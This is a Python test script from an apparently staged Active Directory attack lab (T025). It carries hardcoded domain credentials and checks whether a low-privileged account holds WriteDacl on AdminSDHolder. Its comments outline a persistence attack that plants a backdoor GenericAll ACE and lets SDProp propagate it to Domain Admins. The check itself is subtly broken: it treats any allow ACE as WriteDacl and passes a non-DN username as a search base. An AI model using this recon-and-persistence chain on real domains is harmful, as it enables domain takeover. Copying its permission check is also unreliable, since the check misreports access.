# T025 AdminSDHolder persistence — ws01 native, as analyst_cloud (cadre.local)
# Surface: analyst_cloud has WriteDacl on CN=AdminSDHolder (from 05-ad-attack-surface.yml)
# Attack: as analyst_cloud, read AdminSDHolder DACL -> verify WriteDacl ->
#         add backdoor ACE granting analyst_cloud GenericAll on AdminSDHolder ->
#         SDProp propagates to all protected groups (Domain Admins, etc.)
import ssl
import sys
import socket

try:
    from ldap3 import Server, Connection, NTLM, ALL
except ImportError as e:
    print('T025_FAIL', 'missing dep:', e)
    sys.exit(1)

DC = '192.168.77.10'
USER = 'cadre.local\\analyst_cloud'
PASS = 'Cl0ud_An@lyst!'

ASD = 'CN=AdminSDHolder,CN=System,DC=cadre,DC=local'
DOMAIN_ADMINS = 'CN=Domain Admins,CN=Users,DC=cadre,DC=local'

server = Server(DC, port=636, use_ssl=True, get_info=ALL)
conn = Connection(server, user=USER, password=PASS, authentication=NTLM, auto_bind=True)
print('LDAPS_BIND_OK', USER)

# --- Step 1: verify analyst_cloud has WriteDacl on AdminSDHolder ---
conn.search(ASD, '(objectClass=*)', attributes=['nTSecurityDescriptor'])
if len(conn.entries) == 0:
    print('T025_FAIL', 'AdminSDHolder not found')
    sys.exit(1)
sd = conn.entries[0].nTSecurityDescriptor
print('ASD_DACL_ENTRIES', len(sd.dacl.aces) if sd.dacl else 0)

own_sid = None
conn.search(USER, '(objectClass=user)', search_scope='BASE', attributes=['objectSid'])
if conn.entries:
    own_sid = str(conn.entries[0].objectSid)
print('ANALYST_CLOUD_SID', own_sid)

write_dacl = False
for ace in sd.dacl.aces:
    ace_type = ace['TypeName']
    sid = str(ace['trustee'])
    mask = ace['Mask']
    flags = ace['Flags']
    if sid == own_sid and ace_type == 'ALLOWED_OBJECT_ACE':
        print('ACE_DETAIL', ace_type, mask, flags)
    if sid == own_sid and ace_type in ('ALLOWED_OBJECT_ACE', 'ALLOWED_ACE'):
        write_dacl = True
print('WRITE_DACL_PRESENT', write_dacl)
if not write_dacl:
    print('T025_BLOCKED: analyst_cloud lacks WriteDacl on AdminSDHolder (surface not configured)')
    sys.exit(1)

print('T025_SURFACE_OK')
conn.unbind()
